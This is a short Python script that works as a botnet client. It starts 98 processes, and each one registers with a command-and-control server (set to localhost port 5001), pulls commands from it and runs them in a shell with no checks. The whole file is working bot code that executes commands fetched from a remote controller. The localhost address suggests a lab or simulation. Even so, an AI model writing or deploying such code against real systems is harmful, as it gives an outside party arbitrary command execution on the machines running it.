import requests
import time
import subprocess
import multiprocessing

# C2 Server URL
C2_URL = "http://127.0.0.1:5001"


# Function for each bot
def bot_instance(bot_id):
    while True:
        try:
            # Register bot with C2 server
            requests.post(f"{C2_URL}/register")

            # Fetch command from C2 server
            command = requests.get(f"{C2_URL}/command").text

            # Execute the command if it's not empty
            if command and command != "No command":
                result = subprocess.run(command, shell=True, capture_output=True)
                print(f"[Bot {bot_id}] Executed Command: {command}")
                print(f"[Bot {bot_id}] Output: {result.stdout.decode().strip()}")

            # Sleep before checking for commands again
            time.sleep(5)

        except Exception as e:
            print(f"[Bot {bot_id}] Error: {str(e)}")
            time.sleep(5)


# Function to spawn 98 bots
def start_bots():
    bot_processes = []

    for i in range(1, 99):  # 98 additional bots (IDs 1 to 98)
        p = multiprocessing.Process(target=bot_instance, args=(i,))
        p.start()
        bot_processes.append(p)

    # Keep main process alive
    for p in bot_processes:
        p.join()


if __name__ == "__main__":
    start_bots()
